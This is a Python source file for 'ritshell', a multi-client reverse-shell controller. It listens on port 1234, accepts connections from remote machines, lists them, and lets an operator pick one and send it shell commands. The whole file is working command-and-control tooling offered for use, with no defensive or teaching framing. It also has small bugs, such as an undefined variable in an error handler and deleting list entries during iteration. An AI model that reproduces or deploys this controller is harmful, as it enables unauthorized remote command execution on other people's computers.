import enum
import socket
import sys
import threading
import time
from queue import Queue
import os

NUMBER_OF_THREADS = 2    #for two operation : 
TASK_NUMBER = [1, 2] #Thread1:Listen & accept connection     Thread2: Send commands
queue = Queue()
all_connections = []
all_addresses = []

#create socket
def create_socket():
    try: 
        global host 
        global port 
        global s 
        host = ""
        port = 1234
        s = socket.socket()
    except socket.error as err:
        print("Socket creation error!", str(err))

#bind the socket & listen for connection
def bind_socket():
    try:
        global host
        global port
        global s
        
        print("\nBinding the port", port)
        s.bind((host, port))

        print("listening for connection : ")
        s.listen(100)   #CONNECTION_LIMIT = 100

    except socket.error as err:
        print("Socket binding Failed: ", err, "\n", "Retrying")
        bind_socket()


#send command to client
def send_command(conn):
    try:
        while True:
            cmd = input().strip()
            if cmd == "quit" or cmd == "q":
                break;
        
            if len(cmd.encode())>0:
                conn.send(cmd.encode())
                client_response = str(conn.recv(20000), "utf-8")
                print(client_response)
    except socket.error as err :
        print("Error sending commands : ", err)


#handling connections from multiple clients
#closing previous connections with server.py file is started

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]
    count = 0
    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(True) #prevents timeout
            all_connections.append(conn)
            all_addresses.append(addr)
            print("Connection established!", addr[0])
        except socket.error as err:
            print("<", addr[0],">",  "Error Accepting Connection: ", err, "\n")


def start_ritshell():
    while True:
        cmd = input("ritshell$>").strip()
        if cmd == "quit":
            for c in all_connections:
                c.close()
          #  sys.exit()
            os._exit(0)

        elif cmd=="list":
            list_connections()
    
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_command(conn)
        else:
            print("Command not recognized! Try Again!")



#display all active connections
def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode("test"))
            conn.recv(1024)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + " " + str(all_addresses[i][0]) + " " + str(all_addresses[i][1]) + "\n"
    
    #print all clients
    print("-----Clients-----", "\n", results)

def get_target(cmd):
    try:
        _id = int(cmd.split(' ')[1])
        conn = all_connections[_id]
        print("You're now connected to ", str(all_addresses[_id][0]), "\n")
        print("<" + str(all_addresses[_id][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None


def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=task)
        t.daemon = True
        t.start()

def create_task():
    for x in TASK_NUMBER:
        queue.put(x)
    queue.join()

def task():
    while True:
        x = queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            start_ritshell()

        queue.task_done()

create_threads()
create_task()



